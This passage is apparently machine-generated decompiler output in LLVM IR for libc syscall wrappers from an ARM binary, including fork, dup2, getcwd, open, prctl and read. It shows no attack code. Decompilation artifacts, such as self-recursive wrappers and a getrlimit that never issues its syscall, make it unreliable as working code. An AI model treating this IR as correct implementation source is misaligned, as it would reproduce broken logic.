  %v6_12778 = and i32 %v5_12778, %arg1
  %tmp10 = mul i32 %v3_12774, -65536
  %v5_1277c = add i32 %tmp10, -1
  %v6_1277c = and i32 %v5_1277c, %arg3
  %v2_12780 = mul i32 %v6_1277c, %v6_12778
  %v2_12784 = mul i32 %v6_1277c, %v3_12770
  %v2_12788 = mul i32 %v6_12778, %v3_12774
  %v2_12790 = add i32 %v2_12784, %v2_12788
  %v3_12790 = icmp ult i32 %v2_12790, %v2_12784
  br i1 %v3_12790, label %bb, label %bb9

bb:                                               ; preds = %entry
  br label %bb9

bb9:                                              ; preds = %entry, %bb
  %v4_12798 = mul i32 %v2_12790, 65536
  %v5_12798 = add i32 %v4_12798, %v2_12780
  ret i32 %v5_12798

; uselistorder directives
  uselistorder i32 %v2_12784, { 1, 0 }
  uselistorder i32 %v6_12778, { 1, 0 }
  uselistorder i32 %v3_12774, { 1, 0 }
  uselistorder i32 %v3_12770, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_127c0 = call i32 @vfork()
  store i32 %v0_127c0, i32* @r0, align 4
  %v2_127c4 = icmp ugt i32 %v0_127c0, -4097
  br i1 %v2_127c4, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_127d8, %entry
  %merge = phi i32 [ %v0_127c0, %entry ], [ %v0_127d8, %dec_label_pc_127d8 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_127d0 = icmp eq i32 %v0_127c0, -38
  br i1 %v4_127d0, label %dec_label_pc_127d8, label %bb2

dec_label_pc_127d8:                               ; preds = %bb1
  %v0_127d8 = call i32 @fork()
  store i32 %v0_127d8, i32* @r0, align 4
  %v2_127dc = icmp ugt i32 %v0_127d8, -4097
  br i1 %v2_127dc, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_127d8
  %v0_127e4 = call i32 @__syscall_error()
  ret i32 %v0_127e4

; uselistorder directives
  uselistorder i32 %v0_127d8, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_127f0 = load i32, i32* @r2, align 4
  %v1_12800 = add i32 %arg2, -12
  store i32 %v6_127f0, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_12800, 2
  br i1 %tmp, label %dec_label_pc_12828, label %dec_label_pc_12820

dec_label_pc_12820:                               ; preds = %entry
  %v0_12820 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_12854

dec_label_pc_12828:                               ; preds = %entry
  %v2_12830 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_12830, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_12830, -4095
  br i1 %tmp8, label %dec_label_pc_12854, label %dec_label_pc_12840

dec_label_pc_12840:                               ; preds = %dec_label_pc_12828
  %v0_12840 = call i32 @__errno_location()
  %v0_12844 = load i32, i32* %r4.global-to-local, align 4
  %v1_12844 = sub i32 0, %v0_12844
  %v2_12848 = inttoptr i32 %v0_12840 to i32*
  store i32 %v1_12844, i32* %v2_12848, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12854

dec_label_pc_12854:                               ; preds = %dec_label_pc_12840, %dec_label_pc_12828, %dec_label_pc_12820
  %storemerge = phi i32 [ %v0_12820, %dec_label_pc_12820 ], [ %v2_12830, %dec_label_pc_12828 ], [ -1, %dec_label_pc_12840 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_12830, { 1, 0, 2 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_12884 = load i32, i32* @r0, align 4
  store i32 %v0_12884, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12884, -4095
  br i1 %tmp, label %dec_label_pc_128a0, label %dec_label_pc_12890

dec_label_pc_12890:                               ; preds = %entry
  %v0_12890 = call i32 @__errno_location()
  %v0_12894 = load i32, i32* %r4.global-to-local, align 4
  %v1_12894 = sub i32 0, %v0_12894
  %v2_12898 = inttoptr i32 %v0_12890 to i32*
  store i32 %v1_12894, i32* %v2_12898, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_128a0

dec_label_pc_128a0:                               ; preds = %entry, %dec_label_pc_12890
  %v0_128a0 = phi i32 [ %v0_12884, %entry ], [ -1, %dec_label_pc_12890 ]
  ret i32 %v0_128a0

; uselistorder directives
  uselistorder i32 %v0_12884, { 1, 0, 2 }
  uselistorder label %dec_label_pc_128a0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_128dc = load i32, i32* @r4, align 4
  store i32 %v3_128dc, i32* %stack_var_-8, align 4
  %v0_128e0 = call i32 @chdir()
  store i32 %v0_128e0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_128e0, -4095
  br i1 %tmp, label %dec_label_pc_12900, label %dec_label_pc_128f0

dec_label_pc_128f0:                               ; preds = %entry
  %v0_128f0 = call i32 @__errno_location()
  %v0_128f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_128f4 = sub i32 0, %v0_128f4
  %v2_128f8 = inttoptr i32 %v0_128f0 to i32*
  store i32 %v1_128f4, i32* %v2_128f8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12900

dec_label_pc_12900:                               ; preds = %entry, %dec_label_pc_128f0
  %v0_12900 = phi i32 [ %v0_128e0, %entry ], [ -1, %dec_label_pc_128f0 ]
  %v2_12904 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12904, i32* @r4, align 4
  ret i32 %v0_12900

; uselistorder directives
  uselistorder i32 %v0_128e0, { 1, 0, 2 }
  uselistorder i32 ()* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_12900, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12908 = load i32, i32* @r4, align 4
  store i32 %v3_12908, i32* %stack_var_-8, align 4
  %v1_1290c = call i32 @close(i32 %arg1)
  store i32 %v1_1290c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_1290c, -4095
  br i1 %tmp, label %dec_label_pc_1292c, label %dec_label_pc_1291c

dec_label_pc_1291c:                               ; preds = %entry
  %v0_1291c = call i32 @__errno_location()
  %v0_12920 = load i32, i32* %r4.global-to-local, align 4
  %v1_12920 = sub i32 0, %v0_12920
  %v2_12924 = inttoptr i32 %v0_1291c to i32*
  store i32 %v1_12920, i32* %v2_12924, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1292c

dec_label_pc_1292c:                               ; preds = %entry, %dec_label_pc_1291c
  %v0_1292c = phi i32 [ %v1_1290c, %entry ], [ -1, %dec_label_pc_1291c ]
  %v2_12930 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12930, i32* @r4, align 4
  ret i32 %v0_1292c

; uselistorder directives
  uselistorder i32 %v1_1290c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1292c, { 1, 0 }
}

define i32 @dup2() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12934 = load i32, i32* @r4, align 4
  store i32 %v3_12934, i32* %stack_var_-8, align 4
  %v0_12938 = call i32 @dup2()
  store i32 %v0_12938, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12938, -4095
  br i1 %tmp, label %dec_label_pc_12958, label %dec_label_pc_12948

dec_label_pc_12948:                               ; preds = %entry
  %v0_12948 = call i32 @__errno_location()
  %v0_1294c = load i32, i32* %r4.global-to-local, align 4
  %v1_1294c = sub i32 0, %v0_1294c
  %v2_12950 = inttoptr i32 %v0_12948 to i32*
  store i32 %v1_1294c, i32* %v2_12950, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12958

dec_label_pc_12958:                               ; preds = %entry, %dec_label_pc_12948
  %v0_12958 = phi i32 [ %v0_12938, %entry ], [ -1, %dec_label_pc_12948 ]
  %v2_1295c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1295c, i32* @r4, align 4
  ret i32 %v0_12958

; uselistorder directives
  uselistorder i32 %v0_12938, { 1, 0, 2 }
  uselistorder i32 ()* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12958, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12960 = load i32, i32* @r4, align 4
  store i32 %v3_12960, i32* %stack_var_-8, align 4
  %v0_12964 = call i32 @fork()
  store i32 %v0_12964, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12964, -4095
  br i1 %tmp, label %dec_label_pc_12984, label %dec_label_pc_12974

dec_label_pc_12974:                               ; preds = %entry
  %v0_12974 = call i32 @__errno_location()
  %v0_12978 = load i32, i32* %r4.global-to-local, align 4
  %v1_12978 = sub i32 0, %v0_12978
  %v2_1297c = inttoptr i32 %v0_12974 to i32*
  store i32 %v1_12978, i32* %v2_1297c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12984

dec_label_pc_12984:                               ; preds = %entry, %dec_label_pc_12974
  %v0_12984 = phi i32 [ %v0_12964, %entry ], [ -1, %dec_label_pc_12974 ]
  %v2_12988 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12988, i32* @r4, align 4
  ret i32 %v0_12984

; uselistorder directives
  uselistorder i32 %v0_12964, { 1, 0, 2 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %dec_label_pc_12984, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_1298c = load i32, i32* @r4, align 4
  store i32 %v3_1298c, i32* %stack_var_-20, align 4
  %v6_1298c = load i32, i32* @r5, align 4
  %v9_1298c = load i32, i32* @r6, align 4
  %v12_1298c = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_12990 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r5, align 4
  %v2_1299c = icmp eq i32 %arg1, 0
  br i1 %v2_12990, label %dec_label_pc_1299c, label %dec_label_pc_129cc

dec_label_pc_1299c:                               ; preds = %entry
  br i1 %v2_1299c, label %dec_label_pc_129b8, label %dec_label_pc_129a4

dec_label_pc_129a4:                               ; preds = %dec_label_pc_1299c
  %v0_129a4 = call i32 @__errno_location()
  %v0_129a8 = load i32, i32* @r7, align 4
  store i32 %v0_129a8, i32* @r5, align 4
  %v2_129b0 = inttoptr i32 %v0_129a4 to i32*
  store i32 22, i32* %v2_129b0, align 4
  br label %dec_label_pc_12a5c

dec_label_pc_129b8:                               ; preds = %dec_label_pc_1299c
  %v0_129b8 = call i32 @__GI_getpagesize()
  %v5_129c0 = icmp slt i32 %v0_129b8, 4096
  br i1 %v5_129c0, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_129b8
  store i32 %v0_129b8, i32* @r4, align 4
  br label %dec_label_pc_129dc

bb15:                                             ; preds = %dec_label_pc_129b8
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_129dc

dec_label_pc_129cc:                               ; preds = %entry
  store i32 %arg2, i32* @r4, align 4
  br i1 %v2_1299c, label %dec_label_pc_129dc, label %bb16

bb16:                                             ; preds = %dec_label_pc_129cc
  store i32 %arg1, i32* @r6, align 4
  br label %dec_label_pc_129ec

dec_label_pc_129dc:                               ; preds = %dec_label_pc_129cc, %bb, %bb15
  %v0_129dc = phi i32 [ %v0_129b8, %bb ], [ 4096, %bb15 ], [ %arg2, %dec_label_pc_129cc ]
  %v1_129e0 = call i32 @malloc(i32 %v0_129dc)
  store i32 %v1_129e0, i32* @r6, align 4
  %v2_129e4 = icmp eq i32 %v1_129e0, 0
  br i1 %v2_129e4, label %dec_label_pc_12a58, label %dec_label_pc_129dc.dec_label_pc_129ec_crit_edge

dec_label_pc_129dc.dec_label_pc_129ec_crit_edge:  ; preds = %dec_label_pc_129dc
  %v0_129ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_129ec

dec_label_pc_129ec:                               ; preds = %bb16, %dec_label_pc_129dc.dec_label_pc_129ec_crit_edge
  %v0_129f0 = phi i32 [ %v1_129e0, %dec_label_pc_129dc.dec_label_pc_129ec_crit_edge ], [ %arg1, %bb16 ]
  %v0_129ec = phi i32 [ %v0_129ec.pre, %dec_label_pc_129dc.dec_label_pc_129ec_crit_edge ], [ %arg2, %bb16 ]
  %v2_129f4 = call i32 @getcwd(i32 %v0_129f0, i32 %v0_129ec)
  store i32 %v2_129f4, i32* @r4, align 4
  %tmp = icmp ult i32 %v2_129f4, -4095
  br i1 %tmp, label %dec_label_pc_12a14, label %dec_label_pc_12a04

dec_label_pc_12a04:                               ; preds = %dec_label_pc_129ec
  %v0_12a04 = call i32 @__errno_location()
  %v0_12a08 = load i32, i32* @r4, align 4
  %v1_12a08 = sub i32 0, %v0_12a08
  %v2_12a0c = inttoptr i32 %v0_12a04 to i32*
  store i32 %v1_12a08, i32* %v2_12a0c, align 4
  br label %dec_label_pc_12a44

dec_label_pc_12a14:                               ; preds = %dec_label_pc_129ec
  %v1_12a14 = icmp slt i32 %v2_129f4, 0
  br i1 %v1_12a14, label %dec_label_pc_12a44, label %dec_label_pc_12a1c

dec_label_pc_12a1c:                               ; preds = %dec_label_pc_12a14
  %v0_12a1c = load i32, i32* @r5, align 4
  %v2_12a1c = icmp eq i32 %v0_12a1c, 0
  br i1 %v2_12a1c, label %bb17, label %dec_label_pc_12a38.thread7

dec_label_pc_12a38.thread7:                       ; preds = %dec_label_pc_12a1c
  br label %dec_label_pc_12a5c

bb17:                                             ; preds = %dec_label_pc_12a1c
  %v1_12a20 = load i32, i32* @r7, align 4
  %v3_12a20 = icmp eq i32 %v1_12a20, 0
  br i1 %v3_12a20, label %dec_label_pc_12a38, label %dec_label_pc_12a38.thread

dec_label_pc_12a38.thread:                        ; preds = %bb17
  br label %bb18

dec_label_pc_12a38:                               ; preds = %bb17
  %v0_12a2c = load i32, i32* @r6, align 4
  %v2_12a30 = call i32 @realloc(i32 %v0_12a2c, i32 %v2_129f4)
  store i32 %v2_12a30, i32* @r5, align 4
  %v2_12a38 = icmp eq i32 %v2_12a30, 0
  br i1 %v2_12a38, label %bb18, label %dec_label_pc_12a5c

bb18:                                             ; preds = %dec_label_pc_12a38.thread, %dec_label_pc_12a38
  %v1_12a3c = load i32, i32* @r6, align 4
  store i32 %v1_12a3c, i32* @r5, align 4
  br label %dec_label_pc_12a5c

dec_label_pc_12a44:                               ; preds = %dec_label_pc_12a14, %dec_label_pc_12a04
  %v0_12a44 = load i32, i32* @r5, align 4
  %v2_12a44 = icmp eq i32 %v0_12a44, 0
  br i1 %v2_12a44, label %dec_label_pc_12a4c, label %dec_label_pc_12a58

dec_label_pc_12a4c:                               ; preds = %dec_label_pc_12a44
  %v0_12a4c = load i32, i32* @r6, align 4
  store i32 %v0_12a4c, i32* @r0, align 4
  %v0_12a50 = call i32 @free()
  br label %dec_label_pc_12a5c

dec_label_pc_12a58:                               ; preds = %dec_label_pc_12a44, %dec_label_pc_129dc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12a5c

dec_label_pc_12a5c:                               ; preds = %dec_label_pc_12a38.thread7, %bb18, %dec_label_pc_12a38, %dec_label_pc_12a4c, %dec_label_pc_129a4, %dec_label_pc_12a58
  %v0_12a5c = load i32, i32* @r5, align 4
  %v2_12a60 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12a60, i32* @r4, align 4
  store i32 %v6_1298c, i32* @r5, align 4
  store i32 %v9_1298c, i32* @r6, align 4
  store i32 %v12_1298c, i32* @r7, align 4
  ret i32 %v0_12a5c

; uselistorder directives
  uselistorder i32 %v2_129f4, { 1, 3, 0, 2 }
  uselistorder i32 %v0_129b8, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_12a5c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_129ec, { 1, 0 }
  uselistorder label %dec_label_pc_129dc, { 0, 2, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_12a68 = ptrtoint i32* %stack_var_-12 to i32
  %v2_12a74 = call i32 @getrlimit(i32 7, i32 %v2_12a68)
  %v1_12a78 = icmp slt i32 %v2_12a74, 0
  br i1 %v1_12a78, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v5_12a80 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_12a88 = phi i32 [ 256, %entry ], [ %v5_12a80, %bb ]
  ret i32 %v5_12a88

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v2_12a90 = load i32, i32* @global_var_2c810.813, align 4
  %v2_12a94 = icmp eq i32 %v2_12a90, 0
  br i1 %v2_12a94, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_12a9c = phi i32 [ %v2_12a90, %entry ], [ 4096, %bb ]
  ret i32 %v1_12a9c

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12aa4 = load i32, i32* @r4, align 4
  store i32 %v3_12aa4, i32* %stack_var_-8, align 4
  %v0_12aa8 = call i32 @getpid()
  store i32 %v0_12aa8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12aa8, -4095
  br i1 %tmp, label %dec_label_pc_12ac8, label %dec_label_pc_12ab8

dec_label_pc_12ab8:                               ; preds = %entry
  %v0_12ab8 = call i32 @__errno_location()
  %v0_12abc = load i32, i32* %r4.global-to-local, align 4
  %v1_12abc = sub i32 0, %v0_12abc
  %v2_12ac0 = inttoptr i32 %v0_12ab8 to i32*
  store i32 %v1_12abc, i32* %v2_12ac0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ac8

dec_label_pc_12ac8:                               ; preds = %entry, %dec_label_pc_12ab8
  %v0_12ac8 = phi i32 [ %v0_12aa8, %entry ], [ -1, %dec_label_pc_12ab8 ]
  %v2_12acc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12acc, i32* @r4, align 4
  ret i32 %v0_12ac8

; uselistorder directives
  uselistorder i32 %v0_12aa8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ac8, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ad0 = load i32, i32* @r4, align 4
  store i32 %v3_12ad0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12af4, label %dec_label_pc_12ae4

dec_label_pc_12ae4:                               ; preds = %entry
  %v0_12ae4 = call i32 @__errno_location()
  %v0_12ae8 = load i32, i32* %r4.global-to-local, align 4
  %v1_12ae8 = sub i32 0, %v0_12ae8
  %v2_12aec = inttoptr i32 %v0_12ae4 to i32*
  store i32 %v1_12ae8, i32* %v2_12aec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_12af8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12af4

dec_label_pc_12af4:                               ; preds = %entry, %dec_label_pc_12ae4
  %v2_12af8 = phi i32 [ %v3_12ad0, %entry ], [ %v2_12af8.pre, %dec_label_pc_12ae4 ]
  %v0_12af4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12ae4 ]
  store i32 %v2_12af8, i32* @r4, align 4
  ret i32 %v0_12af4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12af4, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_12b18 = load i32, i32* @r0, align 4
  %v3_12b18 = call i32 @ioctl(i32 %v0_12b18, i32 %arg1, i32 %arg2)
  store i32 %v3_12b18, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_12b18, -4095
  br i1 %tmp, label %dec_label_pc_12b38, label %dec_label_pc_12b28

dec_label_pc_12b28:                               ; preds = %entry
  %v0_12b28 = call i32 @__errno_location()
  %v0_12b2c = load i32, i32* %r4.global-to-local, align 4
  %v1_12b2c = sub i32 0, %v0_12b2c
  %v2_12b30 = inttoptr i32 %v0_12b28 to i32*
  store i32 %v1_12b2c, i32* %v2_12b30, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b38

dec_label_pc_12b38:                               ; preds = %entry, %dec_label_pc_12b28
  %v0_12b38 = phi i32 [ %v3_12b18, %entry ], [ -1, %dec_label_pc_12b28 ]
  ret i32 %v0_12b38

; uselistorder directives
  uselistorder i32 %v3_12b18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12b38, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12b4c = load i32, i32* @r4, align 4
  store i32 %v3_12b4c, i32* %stack_var_-8, align 4
  %v0_12b50 = call i32 @kill()
  store i32 %v0_12b50, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12b50, -4095
  br i1 %tmp, label %dec_label_pc_12b70, label %dec_label_pc_12b60

dec_label_pc_12b60:                               ; preds = %entry
  %v0_12b60 = call i32 @__errno_location()
  %v0_12b64 = load i32, i32* %r4.global-to-local, align 4
  %v1_12b64 = sub i32 0, %v0_12b64
  %v2_12b68 = inttoptr i32 %v0_12b60 to i32*
  store i32 %v1_12b64, i32* %v2_12b68, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b70

dec_label_pc_12b70:                               ; preds = %entry, %dec_label_pc_12b60
  %v0_12b70 = phi i32 [ %v0_12b50, %entry ], [ -1, %dec_label_pc_12b60 ]
  %v2_12b74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12b74, i32* @r4, align 4
  ret i32 %v0_12b70

; uselistorder directives
  uselistorder i32 %v0_12b50, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12b70, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_12b88 = and i32 %arg2, 64
  %v2_12b88 = icmp eq i32 %v1_12b88, 0
  br i1 %v2_12b88, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_12b78 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_12b78, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_12b98 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_12b98, i32* @r2, align 4
  %v4_12ba0 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_12ba4 = icmp eq i32 %v4_12ba0, -4096
  store i1 %v7_12ba4, i1* @cpsr_z, align 1
  store i32 %v4_12ba0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_12ba0, -4095
  br i1 %tmp, label %dec_label_pc_12bc0, label %dec_label_pc_12bb0

dec_label_pc_12bb0:                               ; preds = %.thread1
  %v0_12bb0 = call i32 @__errno_location()
  %v0_12bb4 = load i32, i32* %r4.global-to-local, align 4
  %v1_12bb4 = sub i32 0, %v0_12bb4
  %v2_12bb8 = inttoptr i32 %v0_12bb0 to i32*
  store i32 %v1_12bb4, i32* %v2_12bb8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12bc0

dec_label_pc_12bc0:                               ; preds = %.thread1, %dec_label_pc_12bb0
  %v0_12bc0 = phi i32 [ %v4_12ba0, %.thread1 ], [ -1, %dec_label_pc_12bb0 ]
  ret i32 %v0_12bc0

; uselistorder directives
  uselistorder i32 %v4_12ba0, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_12bc0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_12bdc = load i32, i32* @r0, align 4
  %v2_12bdc = inttoptr i32 %v0_12bdc to i8*
  %v3_12bdc = call i32 @__libc_open(i8* %v2_12bdc, i32 577)
  %v0_12be0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12be0, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_12be0 = and i32 %v3_12bdc, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_12be0 = phi i32 [ %v3_12bdc, %entry ], [ %v6_12be0, %bb ]
  ret i32 %v7_12be0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12be4 = load i32, i32* @r4, align 4
  store i32 %v3_12be4, i32* %stack_var_-8, align 4
  %v1_12be8 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_12be8 = call i32 @pipe([2 x i32] %v1_12be8)
  store i32 %v2_12be8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_12be8, -4095
  br i1 %tmp, label %dec_label_pc_12c08, label %dec_label_pc_12bf8

dec_label_pc_12bf8:                               ; preds = %entry
  %v0_12bf8 = call i32 @__errno_location()
  %v0_12bfc = load i32, i32* %r4.global-to-local, align 4
  %v1_12bfc = sub i32 0, %v0_12bfc
  %v2_12c00 = inttoptr i32 %v0_12bf8 to i32*
  store i32 %v1_12bfc, i32* %v2_12c00, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12c08

dec_label_pc_12c08:                               ; preds = %entry, %dec_label_pc_12bf8
  %v0_12c08 = phi i32 [ %v2_12be8, %entry ], [ -1, %dec_label_pc_12bf8 ]
  %v2_12c0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12c0c, i32* @r4, align 4
  ret i32 %v0_12c08

; uselistorder directives
  uselistorder i32 %v2_12be8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12c08, { 1, 0 }
}

define i32 @prctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c10 = load i32, i32* @r4, align 4
  store i32 %v3_12c10, i32* %stack_var_-8, align 4
  %v0_12c18 = call i32 @prctl()
  store i32 %v0_12c18, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12c18, -4095
  br i1 %tmp, label %dec_label_pc_12c38, label %dec_label_pc_12c28

dec_label_pc_12c28:                               ; preds = %entry
  %v0_12c28 = call i32 @__errno_location()
  %v0_12c2c = load i32, i32* %r4.global-to-local, align 4
  %v1_12c2c = sub i32 0, %v0_12c2c
  %v2_12c30 = inttoptr i32 %v0_12c28 to i32*
  store i32 %v1_12c2c, i32* %v2_12c30, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12c38

dec_label_pc_12c38:                               ; preds = %entry, %dec_label_pc_12c28
  %v0_12c38 = phi i32 [ %v0_12c18, %entry ], [ -1, %dec_label_pc_12c28 ]
  %v2_12c3c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12c3c, i32* @r4, align 4
  ret i32 %v0_12c38

; uselistorder directives
  uselistorder i32 %v0_12c18, { 1, 0, 2 }
  uselistorder i32 ()* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_12c38, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c40 = load i32, i32* @r4, align 4
  store i32 %v3_12c40, i32* %stack_var_-8, align 4
  %v1_12c44 = load i32, i32* @r1, align 4
  %v2_12c44 = inttoptr i32 %v1_12c44 to i32*
  %v3_12c44 = load i32, i32* @r2, align 4
  %v4_12c44 = call i32 @read(i32 %arg1, i32* %v2_12c44, i32 %v3_12c44)
  store i32 %v4_12c44, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_12c44, -4095
  br i1 %tmp, label %dec_label_pc_12c64, label %dec_label_pc_12c54

dec_label_pc_12c54:                               ; preds = %entry
  %v0_12c54 = call i32 @__errno_location()
  %v0_12c58 = load i32, i32* %r4.global-to-local, align 4
